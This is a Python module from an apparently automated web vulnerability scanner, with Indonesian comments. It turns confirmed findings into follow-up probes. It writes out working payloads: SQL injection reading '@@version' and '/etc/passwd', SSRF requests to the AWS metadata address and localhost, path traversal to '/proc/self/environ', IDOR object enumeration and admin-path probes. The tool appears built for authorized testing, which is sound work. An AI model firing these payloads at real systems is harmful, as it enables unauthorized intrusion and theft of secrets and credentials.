"""Chain templates — langkah lanjutan dari temuan yang sudah punya bukti.

Bukan daftar CVE: setiap template membaca URL/parameter nyata dari pasangan
request/response yang menyertai finding, lalu menyusun probe berikutnya yang
masih dalam satu rantai sebab-akibat (mis. IDOR objek → enumerasi objek lain).

Semua proposal tetap berupa USULAN; verifikasi tetap deterministik dan tidak
mengklaim hasil sebelum probe dieksekusi.
"""

from __future__ import annotations

import re
from typing import Any, Iterable, Mapping, Sequence
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

from wth_ai.hunt.proactive import NextTest

_PARAM_HINTS = (
    "id", "uid", "user", "user_id", "account", "tenant", "object", "obj",
    "file", "filename", "path", "url", "uri", "target", "dest", "redirect",
    "redirect_uri", "next", "return", "continue", "callback", "image", "template",
)
_REDIRECT_PARAMS = frozenset({
    "redirect", "redirect_uri", "redirect_url", "next", "return", "continue",
    "callback", "dest", "destination", "url", "target",
})
_TRAVERSAL_PARAMS = frozenset({"file", "filename", "path", "template", "page", "include", "doc", "download"})
_SSRF_PARAMS = frozenset({"url", "uri", "target", "dest", "destination", "callback", "image", "fetch", "src"})

_NUMERIC_SEGMENT = re.compile(r"/(\d+)(?=/|$)")


def _finding_dict(finding: Any) -> dict[str, Any]:
    if isinstance(finding, Mapping):
        return dict(finding)
    data = getattr(finding, "__dict__", None)
    if isinstance(data, dict):
        return dict(data)
    to_dict = getattr(finding, "to_dict", None)
    return dict(to_dict()) if callable(to_dict) else {}


def _evidence_text(finding: Mapping[str, Any]) -> list[str]:
    snippets: list[str] = []
    for item in list(finding.get("evidence") or [])[:3]:
        text = str(item).strip()
        if len(text) >= 12:
            snippets.append(text[:80])
    description = str(finding.get("description") or "").strip()
    if len(description) >= 12:
        snippets.append(description[:80])
    return snippets


def _pair_url(pairs: Sequence[Mapping[str, Any]], finding: Mapping[str, Any]) -> str:
    direct = str(finding.get("target") or finding.get("url") or "")
    if direct:
        return direct
    probes = [
        pair for pair in pairs
        if str(pair.get("url") or "") and "baseline" not in str(pair.get("role") or "").lower()
    ]
    if not probes:
        return ""
    snippets = _evidence_text(finding)
    for pair in reversed(probes):
        body = str(pair.get("body_snippet") or "")
        if snippets and any(snippet.lower() in body.lower() for snippet in snippets):
            return str(pair.get("url") or "")
    return str(probes[-1].get("url") or "")


def _split(url: str) -> tuple[str, str, str, dict[str, str]]:
    parsed = urlsplit(url if "://" in url else f"https://{url}")
    query = {key: value for key, value in parse_qsl(parsed.query, keep_blank_values=True)}
    return f"{parsed.scheme}://{parsed.netloc}", parsed.path or "/", parsed.query, query


def _with_query(url: str, values: Mapping[str, str]) -> str:
    parts = urlsplit(url if "://" in url else f"https://{url}")
    query = dict(parse_qsl(parts.query, keep_blank_values=True))
    query.update(values)
    return urlunsplit(parts._replace(query=urlencode(query)))


def _first_query(url: str) -> tuple[str, str]:
    _, _, _, query = _split(url)
    if not query:
        return "", ""
    name = next((key for key in query if key.lower() in _PARAM_HINTS), next(iter(query)))
    return name, query[name]


def _numeric_target(url: str) -> tuple[str, str]:
    """(kind, value) — 'path' untuk segmen numerik, 'query' untuk param angka."""
    parts = urlsplit(url if "://" in url else f"https://{url}")
    matches = list(_NUMERIC_SEGMENT.finditer(parts.path))
    if matches:
        return "path", matches[-1].group(1)
    name, value = _first_query(url)
    if name and value.isdigit():
        return f"query:{name}", value
    return "", ""


def _replace_numeric(url: str, new_value: str) -> str:
    parts = urlsplit(url if "://" in url else f"https://{url}")
    matches = list(_NUMERIC_SEGMENT.finditer(parts.path))
    if matches:
        last = matches[-1]
        path = parts.path[: last.start(1)] + new_value + parts.path[last.end(1):]
        return urlunsplit(parts._replace(path=path))
    name, _ = _first_query(url)
    if not name:
        return ""
    return _with_query(url, {name: new_value})


def _test(
    title: str,
    rationale: str,
    url: str,
    *,
    finding: Mapping[str, Any],
    vuln_class: str,
    risk: str,
    weight: float,
    purpose: str,
) -> NextTest:
    return NextTest(
        title=title,
        rationale=rationale,
        probe={"method": "GET", "url": url, "purpose": f"chain:{purpose}"},
        risk=risk,
        priority=0.8 * weight,
        source_finding=str(finding.get("id", "")),
        vuln_class=vuln_class,
    )


def _chain_idor(finding, pairs, weight):  # type: ignore[no-untyped-def]
    url = _pair_url(pairs, finding)
    kind, value = _numeric_target(url)
    if not kind or not value.isdigit():
        return []
    base = int(value)
    tests = []
    for candidate in (str(base + 1), str(base - 1), "0"):
        if candidate == value:
            continue
        probe_url = _replace_numeric(url, candidate)
        if not probe_url:
            continue
        tests.append(_test(
            f"Enumerasi objek IDOR #{candidate}",
            f"IDOR di {url[:70]} sudah terbukti; objek {candidate} menguji seberapa luas "
            "batas otorisasi yang bocor (rantai: baca objek lain → data lebih sensitif).",
            probe_url, finding=finding, vuln_class="idor", risk="low", weight=weight,
            purpose="idor-enum",
        ))
    return tests


def _chain_sqli(finding, pairs, weight):  # type: ignore[no-untyped-def]
    url = _pair_url(pairs, finding)
    name, _ = _first_query(url)
    if not name:
        return []
    payloads = [
        ("versi database", "' UNION SELECT @@version-- -"),
        ("file host", "' UNION SELECT LOAD_FILE('/etc/passwd')-- -"),
    ]
    tests = []
    for label, payload in payloads:
        tests.append(_test(
            f"Eskalasi SQLi: baca {label}",
            f"Injeksi SQL di parameter {name} sudah punya sinyal error; probe ini "
            "membuktikan dampak data (rantai: error → ekstraksi data).",
            _with_query(url, {name: payload}), finding=finding, vuln_class="sqli",
            risk="medium", weight=weight, purpose="sqli-exfil",
        ))
    return tests


def _chain_ssrf(finding, pairs, weight):  # type: ignore[no-untyped-def]
    url = _pair_url(pairs, finding)
    _, path, _, query = _split(url)
    name = next((key for key in query if key.lower() in _SSRF_PARAMS), "")
    if not name:
        name, value = _first_query(url)
        if not value.startswith(("http://", "https://", "/")):
            return []
    targets = [
        ("metadata AWS", "http://169.254.169.254/latest/meta-data/"),
        ("port lokal 127.0.0.1:80", "http://127.0.0.1:80/"),
        ("localhost:8080", "http://localhost:8080/"),
    ]
    return [
        _test(
            f"SSRF lanjutan: {label}",
            f"SSRF di {path[:50]} membuktikan server mengambil URL eksternal; probe ini "
            "menguji apakah request bisa diarahkan ke jaringan internal (rantai: SSRF → metadata/port).",
            _with_query(url, {name: target}), finding=finding, vuln_class="ssrf",
            risk="medium", weight=weight, purpose="ssrf-internal",
        )
        for label, target in targets
    ]


def _chain_traversal(finding, pairs, weight):  # type: ignore[no-untyped-def]
    url = _pair_url(pairs, finding)
    _, path, _, query = _split(url)
    name = next((key for key in query if key.lower() in _TRAVERSAL_PARAMS), "")
    if not name:
        name, _ = _first_query(url)
    if not name:
        return []
    payloads = [
        ("hostname", "/etc/hostname"),
        ("environment proses", "../../../../proc/self/environ"),
    ]
    return [
        _test(
            f"Traversal lanjutan: baca {label}",
            f"Path traversal di parameter {name} sudah terbukti; probe ini menguji "
            "dampak file sensitif berikutnya (rantai: traversal → secret/config).",
            _with_query(url, {name: payload}), finding=finding,
            vuln_class="path_traversal", risk="medium", weight=weight,
            purpose="traversal-secret",
        )
        for label, payload in payloads
    ]


def _chain_open_redirect(finding, pairs, weight):  # type: ignore[no-untyped-def]
    url = _pair_url(pairs, finding)
    _, path, _, query = _split(url)
    name = next((key for key in query if key.lower() in _REDIRECT_PARAMS), "")
    if not name:
        return []
    return [
        _test(
            "Open redirect: target eksternal terkontrol",
            f"Parameter {name} mengendalikan redirect; probe ini memakai domain uji "
            "netral untuk membuktikan tujuan eksternal (rantai: redirect → OAuth/credential flow).",
            _with_query(url, {name: "https://wth-redirect.example/x"}),
            finding=finding, vuln_class="open_redirect", risk="low", weight=weight,
            purpose="redirect-external",
        ),
        _test(
            "Open redirect: cek OIDC discovery",
            f"Jika {path[:50]} adalah flow OAuth/OIDC, metadata discovery menentukan "
            "apakah redirect_uri bisa disalahgunakan untuk mencuri code/token.",
            f"{_split(url)[0]}/.well-known/openid-configuration",
            finding=finding, vuln_class="open_redirect", risk="low",
            weight=weight * 0.7, purpose="oauth-discovery",
        ),
    ]


def _chain_auth(finding, pairs, weight):  # type: ignore[no-untyped-def]
    url = _pair_url(pairs, finding)
    if not url:
        return []
    origin, path, _, _ = _split(url)
    if not origin or origin in {"https://", "http://"}:
        return []
    probes = ["/admin", "/api/admin", "/dashboard"]
    return [
        _test(
            f"Bypass auth lanjutan: {probe}",
            f"Temuan otorisasi di {path[:50]} menunjukkan boundary lemah; probe ini "
            "menguji apakah jalur admin yang lazim ikut terbuka (rantai: bypass → admin surface).",
            f"{origin}{probe}", finding=finding, vuln_class="auth", risk="low",
            weight=weight * 0.6, purpose="auth-admin",
        )
        for probe in probes
    ]


_CHAINS = {
    "idor": _chain_idor,
    "sqli": _chain_sqli,
    "ssrf": _chain_ssrf,
    "path_traversal": _chain_traversal,
    "open_redirect": _chain_open_redirect,
    "auth": _chain_auth,
    "bypass": _chain_auth,
}


def chain_next_tests(
    *,
    findings: Iterable[Any] = (),
    request_pairs: Iterable[Mapping[str, Any]] = (),
    weights: Mapping[str, float] | None = None,
    limit: int = 4,
) -> list[NextTest]:
    """Usulan lanjutan dari finding yang punya bukti + URL nyata."""
    from wth_ai.verify.deterministic import normalize_class

    weights = dict(weights or {})
    pairs = list(request_pairs)
    proposals: list[NextTest] = []
    for raw in findings:
        finding = _finding_dict(raw)
        state = str(finding.get("state") or "").lower()
        if state in {"false_positive", "accepted_risk", "fixed"}:
            continue
        text = " ".join(
            str(finding.get(key) or "")
            for key in ("vuln_class", "title", "description", "impact")
        )
        klass = normalize_class(str(finding.get("vuln_class") or "") or None, text)
        builder = _CHAINS.get(klass)
        if builder is None:
            continue
        weight = float(weights.get(klass, 1.0))
        proposals.extend(builder(finding, pairs, weight))

    seen: set[tuple[str, str]] = set()
    unique: list[NextTest] = []
    for test in sorted(proposals, key=lambda item: -item.priority):
        key = (str(test.probe.get("method", "")).upper(), str(test.probe.get("url", "")))
        if not key[1] or key in seen:
            continue
        seen.add(key)
        unique.append(test)
    return unique[: max(1, limit)]
